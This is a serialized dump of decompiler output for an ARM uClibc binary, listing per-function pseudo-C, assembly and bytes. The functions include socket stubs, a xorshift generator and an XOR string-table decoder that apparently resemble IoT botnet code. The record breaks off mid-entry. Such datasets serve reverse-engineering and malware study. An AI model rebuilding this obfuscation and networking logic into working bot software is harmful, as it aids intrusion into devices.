V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigemptyset(sigset_t *__set)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000088f8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_0001329c)();\u000a  return iVar1;\u000a}\u000a\u000a
p178
S'adr r12,0x88f8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9a4]!\n'
p179
S'00 c6 8f e2\n0a ca 8c e2\na4 f9 bc e5\n'
p180
S'.plt:000088f0\n.plt:000088f4\n.plt:000088f8\n'
p181
tp182
sS'FUN_0000af90'
p183
(S'\n__stdcall FUN_0000af90()\n'
p184
V\u000avoid FUN_0000af90(void)\u000a\u000a{\u000a  raise(8);\u000a  return;\u000a}\u000a\u000a
p185
S'stmdb sp!,{ r1 lr }\nmov r0,#0x8\nbl 0x00008a64\nldmia sp!,{ r1 lr }\nbx lr\n'
p186
S'02 40 2d e9\n08 00 a0 e3\nb1 f6 ff eb\n02 40 bd e8\n1e ff 2f e1\n'
p187
S'.text:0000af90\n.text:0000af94\n.text:0000af98\n.text:0000af9c\n.text:0000afa0\n'
p188
tp189
sS'FUN_00008eac'
p190
(S'\n__stdcall FUN_00008eac()\n'
p191
V\u000aundefined4 FUN_00008eac(int iParm1,int *piParm2,uint uParm3,undefined4 uParm4)\u000a\u000a{\u000a  int *piVar1;\u000a  int iVar2;\u000a  \u000a  if (iParm1 != 0) {\u000a    if ((uint)*(byte *)(piParm2 + 1) != uParm3) {\u000a      iVar2 = 0;\u000a      piVar1 = piParm2 + 2;\u000a      do {\u000a        piParm2 = piVar1;\u000a        iVar2 = iVar2 + 1;\u000a        if (iVar2 == iParm1) {\u000a          return uParm4;\u000a        }\u000a        piVar1 = piParm2 + 2;\u000a      } while (uParm3 != (uint)*(byte *)(piParm2 + 1));\u000a    }\u000a    if (*piParm2 != 0) {\u000a      uParm4 = FUN_0000acac(*piParm2,10);\u000a    }\u000a  }\u000a  return uParm4;\u000a}\u000a\u000a
p192
S'cmp r0,#0x0\nstmdb sp!,{ r4 lr }\ncpy r4,r3\nbeq 0x00008ef4\nldrb r3,[r1,#0x4]\ncmp r3,r2\naddne r12,r1,#0x8\nmovne lr,#0x0\nbne 0x00008ee4\nb 0x00008f00\nldrb r3,[r12,#0x4]\ncmp r2,r3\nadd r12,r12,#0x8\nbeq 0x00008f00\nadd lr,lr,#0x1\ncmp lr,r0\ncpy r1,r12\nbne 0x00008ed4\ncpy r0,r4\nldmia sp!,{ r4 lr }\nbx lr\nldr r0,[r1,#0x0]\ncmp r0,#0x0\nbeq 0x00008ef4\nmov r1,#0xa\nbl 0x0000acac\ncpy r4,r0\nb 0x00008ef4\n'
p193
S'00 00 50 e3\n10 40 2d e9\n03 40 a0 e1\n0d 00 00 0a\n04 30 d1 e5\n02 00 53 e1\n08 c0 81 12\n00 e0 a0 13\n04 00 00 1a\n0a 00 00 ea\n04 30 dc e5\n03 00 52 e1\n08 c0 8c e2\n06 00 00 0a\n01 e0 8e e2\n00 00 5e e1\n0c 10 a0 e1\nf7 ff ff 1a\n04 00 a0 e1\n10 40 bd e8\n1e ff 2f e1\n00 00 91 e5\n00 00 50 e3\nf9 ff ff 0a\n0a 10 a0 e3\n65 07 00 eb\n00 40 a0 e1\nf5 ff ff ea\n'
p194
S'.text:00008eac\n.text:00008eb0\n.text:00008eb4\n.text:00008eb8\n.text:00008ebc\n.text:00008ec0\n.text:00008ec4\n.text:00008ec8\n.text:00008ecc\n.text:00008ed0\n.text:00008ed4\n.text:00008ed8\n.text:00008edc\n.text:00008ee0\n.text:00008ee4\n.text:00008ee8\n.text:00008eec\n.text:00008ef0\n.text:00008ef4\n.text:00008ef8\n.text:00008efc\n.text:00008f00\n.text:00008f04\n.text:00008f08\n.text:00008f0c\n.text:00008f10\n.text:00008f14\n.text:00008f18\n'
p195
tp196
sS'send'
p197
(S'\n__stdcall send(int __fd, void * __buf, size_t __n, int __flags)\n'
p198
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t send(int __fd,void *__buf,size_t __n,int __flags)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008958. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_000132bc)();\u000a  return sVar1;\u000a}\u000a\u000a
p199
S'adr r12,0x8958\nadd r12,r12,#0xa000\nldr pc,[r12,#0x964]!\n'
p200
S'00 c6 8f e2\n0a ca 8c e2\n64 f9 bc e5\n'
p201
S'.plt:00008950\n.plt:00008954\n.plt:00008958\n'
p202
tp203
sS'inet_addr'
p204
(S'\n__stdcall inet_addr(char * __cp)\n'
p205
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000ain_addr_t inet_addr(char *__cp)\u000a\u000a{\u000a  in_addr_t iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089a0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132d4)();\u000a  return iVar1;\u000a}\u000a\u000a
p206
S'adr r12,0x89a0\nadd r12,r12,#0xa000\nldr pc,[r12,#0x934]!\n'
p207
S'00 c6 8f e2\n0a ca 8c e2\n34 f9 bc e5\n'
p208
S'.plt:00008998\n.plt:0000899c\n.plt:000089a0\n'
p209
tp210
sS'FUN_0000a308'
p211
(S'\n__stdcall FUN_0000a308()\n'
p212
V\u000avoid FUN_0000a308(void)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  undefined *puVar3;\u000a  uint uVar4;\u000a  uint uVar5;\u000a  undefined4 uVar6;\u000a  \u000a  puVar3 = PTR_DAT_0000a360;\u000a  puVar2 = PTR_DAT_0000a35c;\u000a  puVar1 = PTR_DAT_0000a358;\u000a  uVar4 = *(uint *)PTR_DAT_0000a358;\u000a  uVar5 = *(uint *)PTR_DAT_0000a354 ^ *(uint *)PTR_DAT_0000a354 << 0xb;\u000a  uVar6 = *(undefined4 *)PTR_DAT_0000a360;\u000a  *(undefined4 *)PTR_DAT_0000a354 = *(undefined4 *)PTR_DAT_0000a35c;\u000a  *(undefined4 *)puVar2 = uVar6;\u000a  *(uint *)puVar3 = uVar4;\u000a  *(uint *)puVar1 = uVar4 ^ uVar4 >> 0x13 ^ uVar5 ^ uVar5 >> 8;\u000a  return;\u000a}\u000a\u000a
p213
S'stmdb sp!,{ r4 r5 r6 lr }\nldr r5,[0xa354]\nldr r6,[0xa358]\nldr r3,[r5,#0x0]\nldr r2,[r6,#0x0]\nldr lr,[0xa35c]\nldr r4,[0xa360]\neor r3,r3,r3, lsl #0xb\neor r0,r2,r2, lsr #0x13\nldr r1,[lr,#0x0]\nldr r12,[r4,#0x0]\neor r0,r0,r3\neor r0,r0,r3, lsr #0x8\nstr r1,[r5,#0x0]\nstr r12,[lr,#0x0]\nstr r2,[r4,#0x0]\nstr r0,[r6,#0x0]\nldmia sp!,{ r4 r5 r6 lr }\nbx lr\n'
p214
S'70 40 2d e9\n40 50 9f e5\n40 60 9f e5\n00 30 95 e5\n00 20 96 e5\n38 e0 9f e5\n38 40 9f e5\n83 35 23 e0\na2 09 22 e0\n00 10 9e e5\n00 c0 94 e5\n03 00 20 e0\n23 04 20 e0\n00 10 85 e5\n00 c0 8e e5\n00 20 84 e5\n00 00 86 e5\n70 40 bd e8\n1e ff 2f e1\n'
p215
S'.text:0000a308\n.text:0000a30c\n.text:0000a310\n.text:0000a314\n.text:0000a318\n.text:0000a31c\n.text:0000a320\n.text:0000a324\n.text:0000a328\n.text:0000a32c\n.text:0000a330\n.text:0000a334\n.text:0000a338\n.text:0000a33c\n.text:0000a340\n.text:0000a344\n.text:0000a348\n.text:0000a34c\n.text:0000a350\n'
p216
tp217
sS'FUN_0000a63c'
p218
(S'\n__stdcall FUN_0000a63c()\n'
p219
V\u000avoid FUN_0000a63c(int iParm1)\u000a\u000a{\u000a  int *piVar1;\u000a  undefined4 uVar2;\u000a  int iVar3;\u000a  \u000a  piVar1 = (int *)(PTR_DAT_0000a6d4 + iParm1 * 8);\u000a  uVar2 = *(undefined4 *)PTR_DAT_0000a6d8;\u000a  if (*(short *)(piVar1 + 1) != 0) {\u000a    iVar3 = 0;\u000a    do {\u000a      *(byte *)(iVar3 + *piVar1) = (byte)uVar2 ^ *(byte *)(iVar3 + *piVar1);\u000a      *(byte *)(iVar3 + *piVar1) = (byte)((uint)uVar2 >> 8) ^ *(byte *)(iVar3 + *piVar1);\u000a      *(byte *)(iVar3 + *piVar1) = (byte)((uint)uVar2 >> 0x10) ^ *(byte *)(iVar3 + *piVar1);\u000a      *(byte *)(iVar3 + *piVar1) = (byte)((uint)uVar2 >> 0x18) ^ *(byte *)(iVar3 + *piVar1);\u000a      iVar3 = iVar3 + 1;\u000a    } while (iVar3 < (int)(uint)*(ushort *)(piVar1 + 1));\u000a  }\u000a  return;\u000a}\u000a\u000a
p220
S'ldr r3,[0xa6d4]\nldr r2,[0xa6d8]\nmov r0,r0, lsl #0x3\nadd r0,r0,r3\nldr r1,[r2,#0x0]\nldrh r3,[r0,#0x4]\nmov r2,r1, lsr #0x8\ncmp r3,#0x0\nmov r3,r1, lsr #0x10\nstmdb sp!,{ r4 r5 r6 lr }\nand r6,r2,#0xff\nand r5,r3,#0xff\nmov r4,r1, lsr #0x18\nand lr,r1,#0xff\nbeq 0x0000a6cc\nmov r12,#0x0\nldr r2,[r0,#0x0]\nldrb r3,[r12,r2]\neor r3,lr,r3\nstrb r3,[r12,r2]\nldr r1,[r0,#0x0]\nldrb r3,[r12,r1]\neor r3,r6,r3\nstrb r3,[r12,r1]\nldr r2,[r0,#0x0]\nldrb r3,[r12,r2]\neor r3,r5,r3\nstrb r3,[r12,r2]\nldr r1,[r0,#0x0]\nldrb r3,[r12,r1]\neor r3,r4,r3\nstrb r3,[r12,r1]\nldrh r2,[r0,#0x4]\nadd r12,r12,#0x1\ncmp r2,r12\nbgt 0x0000a67c\nldmia sp!,{ r4 r5 r6 lr }\nbx lr\n'
p221
S'90 30 9f e5\n90 20 9f e5\n80 01 a0 e1\n03 00 80 e0\n00 10 92 e5\nb4 30 d0 e1\n21 24 a0 e1\n00 00 53 e3\n21 38 a0 e1\n70 40 2d e9\nff 60 02 e2\nff 50 03 e2\n21 4c a0 e1\nff e0 01 e2\n14 00 00 0a\n00 c0 a0 e3\n00 20 90 e5\n02 30 dc e7\n03 30 2e e0\n02 30 cc e7\n00 10 90 e5\n01 30 dc e7\n03 30 26 e0\n01 30 cc e7\n00 20 90 e5\n02 30 dc e7\n03 30 25 e0\n02 30 cc e7\n00 10 90 e5\n01 30 dc e7\n03 30 24 e0\n01 30 cc e7\nb4 20 d0 e1\n01 c0 8c e2\n0c 00 52 e1\neb ff ff ca\n70 40 bd e8\n1e ff 2f e1\n'
p222
S'.text:0000a63c\n.text:0000a640\n.text:0000a644\n.text:0000a648\n.text:0000a64c\n.text:0000a650\n.text:0000a654\n.text:0000a658\n.text:0000a65c\n.text:0000a660\n.text:0000a664\n.text:0000a668\n.text:0000a66c\n.text:0000a670\n.text:0000a674\n.text:0000a678\n.text:0000a67c\n.text:0000a680\n.text:0000a684\n.text:0000a688\n.text:0000a68c\n.text:0000a690\n.text:0000a694\n.text:0000a698\n.text:0000a69c\n.text:0000a6a0\n.text:0000a6a4\n.text:0000a6a8\n.text:0000a6ac\n.text:0000a6b0\n.text:0000a6b4\n.text:0000a6b8\n.text:0000a6bc\n.text:0000a6c0\n.text:0000a6c4\n.text:0000a6c8\n.text:0000a6cc\n.text:0000a6d0\n'
p223
tp224
sS'FUN_0000af78'
p225
(S'\n__stdcall FUN_0000af78()\n'
p226
V\u000avoid FUN_0000af78(void)\u000a\u000a{\u000a  FUN_0000ae7c();\u000a  return;\u000a}\u000a\u000a
p227
S'stmdb sp!,{ r0 r1 lr }\nbl 0x0000ae7c\nldmia sp!,{ r1 r2 lr }\nmul r3,r2,r0\nsub r1,r1,r3\nbx lr\n'
p228
S'03 40 2d e9\nbe ff ff eb\n06 40 bd e8\n92 00 03 e0\n03 10 41 e0\n1e ff 2f e1\n'
p229
S'.text:0000af78\n.text:0000af7c\n.text:0000af80\n.text:0000af84\n.text:0000af88\n.text:0000af8c\n'
p230
tp231
sS'FUN_0000acac'
p232
(S'\n__stdcall FUN_0000acac()\n'
p233
V\u000auint FUN_0000acac(byte *pbParm1,int iParm2)\u000a\u000a{\u000a  byte bVar1;\u000a  bool bVar2;\u000a  uint uVar3;\u000a  uint uVar4;\u000a  int extraout_r1;\u000a  uint uVar5;\u000a  int iVar6;\u000a  uint uVar7;\u000a  uint uVar8;\u000a  byte *pbVar9;\u000a  byte *pbVar10;\u000a  undefined4 uVar11;\u000a  uint uVar12;\u000a  \u000a  do {\u000a    do {\u000a      pbVar9 = pbParm1;\u000a      pbParm1 = pbVar9 + 1;\u000a      bVar1 = *pbVar9;\u000a    } while (bVar1 == 9 || bVar1 == 0x20);\u000a  } while (bVar1 == 10);\u000a  if (bVar1 == 0x2d) {\u000a    pbVar10 = pbVar9 + 2;\u000a    bVar1 = *pbParm1;\u000a    uVar11 = 0x80000000;\u000a    bVar2 = true;\u000a  }\u000a  else {\u000a    pbVar10 = pbParm1;\u000a    if (bVar1 == 0x2b) {\u000a      pbVar10 = pbVar9 + 2;\u000a      bVar1 = *pbParm1;\u000a    }\u000a    uVar11 = 0x7fffffff;\u000a    bVar2 = false;\u000a  }\u000a  uVar8 = (uint)bVar1;\u000a  FUN_0000af78(uVar11,iParm2);\u000a  uVar3 = FUN_0000ae7c(uVar11,iParm2);\u000a  uVar4 = 0;\u000a  uVar12 = 0;\u000a  do {\u000a    uVar5 = uVar8 - 0x61;\u000a    iVar6 = uVar8 - 0x30;\u000a    uVar7 = uVar8 - 0x41;\u000a    if (9 < uVar8 - 0x30) {\u000a      if (0x19 >= uVar7) {\u000a        uVar5 = uVar7;\u000a      }\u000a      if (0x19 < uVar5) {\u000aLAB_0000adac:\u000a        if ((int)uVar12 < 0) {\u000a          if (bVar2) {\u000a            uVar4 = 0x80000000;\u000a          }\u000a          else {\u000a            uVar4 = 0x7fffffff;\u000a          }\u000a        }\u000a        else {\u000a          if (bVar2) {\u000a            uVar4 = -uVar4;\u000a          }\u000a        }\u000a        return uVar4;\u000a      }\u000a      if (0x19 < uVar7) {\u000a        iVar6 = 0x57;\u000a      }\u000a      else {\u000a        iVar6 = 0x37;\u000a      }\u000a      iVar6 = uVar8 - iVar6;\u000a    }\u000a    if (iParm2 <= iVar6) goto LAB_0000adac;\u000a    if ((((uint)(uVar3 < uVar4) | uVar12 >> 0x1f) == 0) &&\u000a       (uVar12 = 1, iVar6 <= extraout_r1 || uVar4 != uVar3)) {\u000a      uVar4 = iParm2 * uVar4 + iVar6;\u000a      uVar8 = (uint)*pbVar10;\u000a      pbVar10 = pbVar10 + 1;\u000a    }\u000a    else {\u000a      uVar8 = (uint)*pbVar10;\u000a      uVar12 = 0xffffffff;\u000a      pbVar10 = pbVar10 + 1;\u000a    }\u000a  } while( true );\u000a}\u000a\u000a
p234
S'stmdb sp!,{ r4 r5 r6 r7 r8 r10 lr }\ncpy r5,r0\nsub sp,sp,#0x4\ncpy r6,r1\nldrb r3,[r5],#0x1\ncmp r3,#0x9\ncmpne r3,#0x20\ncpy r4,r3\nbeq 0x0000acbc\ncmp r3,#0xa\nbeq 0x0000acbc\ncmp r3,#0x2d\nbeq 0x0000adc8\ncmp r3,#0x2b\nldrbeq r4,[r5],#0x1\nmvn r7,#0x80000000\nmov r10,#0x0\ncpy r0,r7\ncpy r1,r6\nbl 0x0000af78\ncpy r0,r7\ncpy r8,r1\ncpy r1,r6\nbl 0x0000ae7c\ncpy lr,r0\nmov r0,#0x0\ncpy r12,r0\nand r3,r4,#0xff\nsub r2,r3,#0x30\ncmp r2,#0x9\nsub r1,r3,#0x61\nsub r2,r4,#0x30\nsub r3,r3,#0x41\nbls 0x0000ad5c\ncmp r3,#0x19\nmovhi r2,#0x0\nmovls r2,#0x1\ncmp r3,#0x19\ncmphi r1,#0x19\nbhi 0x0000adac\ncmp r2,#0x0\nmoveq r3,#0x57\nmovne r3,#0x37\nrsb r2,r3,r4\ncmp r2,r6\nbge 0x0000adac\ncmp r0,lr\nmovls r3,#0x0\nmovhi r3,#0x1\norrs r12,r3,r12, lsr #0x1f\nbne 0x0000ada0\ncmp r0,lr\nmovne r3,#0x0\nmoveq r3,#0x1\ncmp r2,r8\nmovle r3,#0x0\ncmp r3,#0x0\nmov r12,#0x1\nmlaeq r0,r6,r0,r2\nldrbeq r4,[r5],#0x1\nbeq 0x0000ad18\nldrb r4,[r5],#0x1\nmvn r12,#0x0\nb 0x0000ad18\ncmp r12,#0x0\nblt 0x0000add8\ncmp r10,#0x0\nrsbne r0,r0,#0x0\nadd sp,sp,#0x4\nldmia sp!,{ r4 r5 r6 r7 r8 r10 lr }\nbx lr\nldrb r4,[r5],#0x1\nmov r7,#0x80000000\nmov r10,#0x1\nb 0x0000acf0\ncmp r10,#0x0\nmvneq r0,#0x80000000\nmovne r0,#0x80000000\nb 0x0000adbc\n'
p235
S'f0 45 2d e9\n00 50 a0 e1\n04 d0 4d e2\n01 60 a0 e1\n01 30 d5 e4\n09 00 53 e3\n20 00 53 13\n03 40 a0 e1\nfa ff ff 0a\n0a 00 53 e3\nf8 ff ff 0a\n2d 00 53 e3\n39 00 00 0a\n2b 00 53 e3\n01 40 d5 04\n02 71 e0 e3\n00 a0 a0 e3\n07 00 a0 e1\n06 10 a0 e1\n9e 00 00 eb\n07 00 a0 e1\n01 80 a0 e1\n06 10 a0 e1\n5b 00 00 eb\n00 e0 a0 e1\n00 00 a0 e3\n00 c0 a0 e1\nff 30 04 e2\n30 20 43 e2\n09 00 52 e3\n61 10 43 e2\n30 20 44 e2\n41 30 43 e2\n09 00 00 9a\n19 00 53 e3\n00 20 a0 83\n01 20 a0 93\n19 00 53 e3\n19 00 51 83\n17 00 00 8a\n00 00 52 e3\n57 30 a0 03\n37 30 a0 13\n04 20 63 e0\n06 00 52 e1\n11 00 00 aa\n0e 00 50 e1\n00 30 a0 93\n01 30 a0 83\nac cf 93 e1\n09 00 00 1a\n0e 00 50 e1\n00 30 a0 13\n01 30 a0 03\n08 00 52 e1\n00 30 a0 d3\n00 00 53 e3\n01 c0 a0 e3\n96 20 20 00\n01 40 d5 04\ndd ff ff 0a\n01 40 d5 e4\n00 c0 e0 e3\nda ff ff ea\n00 00 5c e3\n08 00 00 ba\n00 00 5a e3\n00 00 60 12\n04 d0 8d e2\nf0 45 bd e8\n1e ff 2f e1\n01 40 d5 e4\n02 71 a0 e3\n01 a0 a0 e3\nc5 ff ff ea\n00 00 5a e3\n02 01 e0 03\n02 01 a0 13\nf4 ff ff ea\n'
p236
S'.text:0000acac\n.text:0000acb0\n.text:0000acb4\n.text:0000acb8\n.text:0000acbc\n.text:0000acc0\n.text:0000acc4\n.text:0000acc8\n.text:0000accc\n.text:0000acd0\n.text:0000acd4\n.text:0000acd8\n.text:0000acdc\n.text:0000ace0\n.text:0000ace4\n.text:0000ace8\n.text:0000acec\n.text:0000acf0\n.text:0000acf4\n.text:0000acf8\n.text:0000acfc\n.text:0000ad00\n.text:0000ad04\n.text:0000ad08\n.text:0000ad0c\n.text:0000ad10\n.text:0000ad14\n.text:0000ad18\n.text:0000ad1c\n.text:0000ad20\n.text:0000ad24\n.text:0000ad28\n.text:0000ad2c\n.text:0000ad30\n.text:0000ad34\n.text:0000ad38\n.text:0000ad3c\n.text:0000ad40\n.text:0000ad44\n.text:0000ad48\n.text:0000ad4c\n.text:0000ad50\n.text:0000ad54\n.text:0000ad58\n.text:0000ad5c\n.text:0000ad60\n.text:0000ad64\n.text:0000ad68\n.text:0000ad6c\n.text:0000ad70\n.text:0000ad74\n.text:0000ad78\n.text:0000ad7c\n.text:0000ad80\n.text:0000ad84\n.text:0000ad88\n.text:0000ad8c\n.text:0000ad90\n.text:0000ad94\n.text:0000ad98\n.text:0000ad9c\n.text:0000ada0\n.text:0000ada4\n.text:0000ada8\n.text:0000adac\n.text:0000adb0\n.text:0000adb4\n.text:0000adb8\n.text:0000adbc\n.text:0000adc0\n.text:0000adc4\n.text:0000adc8\n.text:0000adcc\n.text:0000add0\n.text:0000add4\n.text:0000add8\n.text:0000addc\n.text:0000ade0\n.text:0000ade4\n'
p237
tp238
sS'sigaddset'
p239
(S'\n__stdcall sigaddset(sigset_t * __set, int __signo)\n'
p240
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigaddset(sigset_t *__set,int __signo)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x0000894c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132b8)();\u000a  return iVar1;\u000a}\u000a\u000a
p241
S'adr r12,0x894c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x96c]!\n'
p242
S'00 c6 8f e2\n0a ca 8c e2\n6c f9 bc e5\n'
p243
S'.plt:00008944\n.plt:00008948\n.plt:0000894c\n'
p244
tp245
sS'_start'
p246
(S'\n__stdcall _start(undefined param_1, undefined param_2, undefined param_3, undefined param_4, undefined4 param_5)\n'
p247
V\u000avoid _start(undefined4 param_1)\u000a\u000a{\u000a  undefined4 param_5;\u000a  \u000a  __uClibc_main(PTR_FUN_00008b20,param_5,&stack0x00000004,PTR_LAB_00008b24,PTR_LAB_00008b1c,param_1)\u000a  ;\u000a  return;\u000a}\u000a\u000a
p248
S'mov r11,#0x0\nmov lr,#0x0\nldr r1,[sp],#0x4\ncpy r2,sp\nstr r2,[sp,#-0x4]!\nstr r0,[sp,#-0x4]!\nldr r12,[0x8b1c]\nstr r12,[sp,#-0x4]!\nldr r0,[0x8b20]\nldr r3,[0x8b24]\nb 0x000089e0\n'
p249
S'00 b0 a0 e3\n00 e0 a0 e3\n04 10 9d e4\n0d 20 a0 e1\n04 20 2d e5\n04 00 2d e5\n10 c0 9f e5\n04 c0 2d e5\n0c 00 9f e5\n0c 30 9f e5\nb1 ff ff ea\n'
p250
S'.text:00008aec\n.text:00008af0\n.text:00008af4\n.text:00008af8\n.text:00008afc\n.text:00008b00\n.text:00008b04\n.text:00008b08\n.text:00008b0c\n.text:00008b10\n.text:00008b14\n'
p251
tp252
sS'fcntl'
p253
(S'\n__stdcall fcntl(int __fd, int __cmd)\n'
p254
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint fcntl(int __fd,int __cmd,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a54. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013310)();\u000a  return iVar1;\u000a}\u000a\u000a
p255
S'adr r12,0x8a54\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8bc]!\n'
p256
S'00 c6 8f e2\n0a ca 8c e2\nbc f8 bc e5\n'
p257
S'.plt:00008a4c\n.plt:00008a50\n.plt:00008a54\n'
p258
tp259
sS'__uClibc_main'
p260
(S'\n__stdcall __uClibc_main()\n'
p261
V\u000avoid __uClibc_main(void)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x000089e8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_000132ec)();\u000a  return;\u000a}\u000a\u000a
p262
S'adr r12,0x89e8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x904]!\n'
p263
S'00 c6 8f e2\n0a ca 8c e2\n04 f9 bc e5\n'
p264
S'.plt:000089e0\n.plt:000089e4\n.plt:000089e8\n'
p265
tp266
sS'getsockopt'
p267
(S'\n__stdcall getsockopt(int __fd, int __level, int __optname, void * __optval, socklen_t * __optlen)\n'
p268
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint getsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t *__optlen)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a0c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132f8)();\u000a  return iVar1;\u000a}\u000a\u000a
p269
S'adr r12,0x8a0c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8ec]!\n'
p270
S'00 c6 8f e2\n0a ca 8c e2\nec f8 bc e5\n'
p271
S'.plt:00008a04\n.plt:00008a08\n.plt:00008a0c\n'
p272
tp273
sS'calloc'
p274
(S'\n__stdcall calloc(size_t __nmemb, size_t __size)\n'
p275
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * calloc(size_t __nmemb,size_t __size)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008970. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000132c4)();\u000a  return pvVar1;\u000a}\u000a\u000a
p276
S'adr r12,0x8970\nadd r12,r12,#0xa000\nldr pc,[r12,#0x954]!\n'
p277
S'00 c6 8f e2\n0a ca 8c e2\n54 f9 bc e5\n'
p278
S'.plt:00008968\n.plt:0000896c\n.plt:00008970\n'
p279
tp280
sS'setsockopt'
p281
(S'\n__stdcall setsockopt(int __fd, int __level, int __optname, void * __optval, socklen_t __optlen)\n'
p282
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint setsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t __optlen)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089ac. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132d8)();\u000a  return iVar1;\u000a}\u000a\u000a
p283
S'adr r12,0x89ac\nadd r12,r12,#0xa000\nldr pc,[r12,#0x92c]!\n'
p284
S'00 c6 8f e2\n0a ca 8c e2\n2c f9 bc e5\n'
p285
S'.plt:000089a4\n.plt:000089a8\n.plt:000089ac\n'
p286
tp287
sS'ioctl'
p288
(S'\n__stdcall ioctl(int __fd, ulong __request)\n'
p289
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint ioctl(int __fd,ulong __request,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000088d4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013290)();\u000a  return iVar1;\u000a}\u000a\u000a
p290
S'adr r12,0x88d4\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9bc]!\n'
p291
S'00 c6 8f e2\n0a ca 8c e2\nbc f9 bc e5\n'
p292
S'.plt:000088cc\n.plt:000088d0\n.plt:000088d4\n'
p293
tp294
sS'sleep'
p295
(S'\n__stdcall sleep(uint __seconds)\n'
p296
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000auint sleep(uint __seconds)\u000a\u000a{\u000a  uint uVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008928. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  uVar1 = (*(code *)PTR_LAB_000132ac)();\u000a  return uVar1;\u000a}\u000a\u000a
p297
S'adr r12,0x8928\nadd r12,r12,#0xa000\nldr pc,[r12,#0x984]!\n'
p298
S'00 c6 8f e2\n0a ca 8c e2\n84 f9 bc e5\n'
p299
S'.plt:00008920\n.plt:00008924\n.plt:00008928\n'
p300
tp301
sS'FUN_0000a578'
p302
(S'\n__stdcall FUN_0000a578()\n'
p303
V\u000aundefined4 FUN_0000a578(int iParm1,undefined4 *puParm2)\u000a\u000a{\u000a  undefined4 uVar1;\u000a  undefined *puVar2;\u000a  \u000a  puVar2 = PTR_DAT_0000a598 + iParm1 * 8;\u000a  if (puParm2 != (undefined4 *)0x0) {\u000a    puVar2 = (undefined *)(uint)*(ushort *)(puVar2 + 4);\u000a  }\u000a  uVar1 = *(undefined4 *)(PTR_DAT_0000a598 + iParm1 * 8);\u000a  if (puParm2 != (undefined4 *)0x0) {\u000a    *(undefined **)puParm2 = puVar2;\u000a  }\u000a  return uVar1;\u000a}\u000a\u000a
p304
S'ldr r2,[0xa598]\nmov r0,r0, lsl #0x3\nadd r3,r0,r2\ncmp r1,#0x0\nldrhne r3,[r3,#0x4]\nldr r0,[r0,r2]\nstrne r3,[r1,#0x0]\nbx lr\n'
p305
S'18 20 9f e5\n80 01 a0 e1\n02 30 80 e0\n00 00 51 e3\nb4 30 d3 11\n02 00 90 e7\n00 30 81 15\n1e ff 2f e1\n'
p306
S'.text:0000a578\n.text:0000a57c\n.text:0000a580\n.text:0000a584\n.text:0000a588\n.text:0000a58c\n.text:0000a590\n.text:0000a594\n'
p307
tp308
sS'FUN_0000ade8'
p309
(S'\n__stdcall FUN_0000ade8()\n'
p310
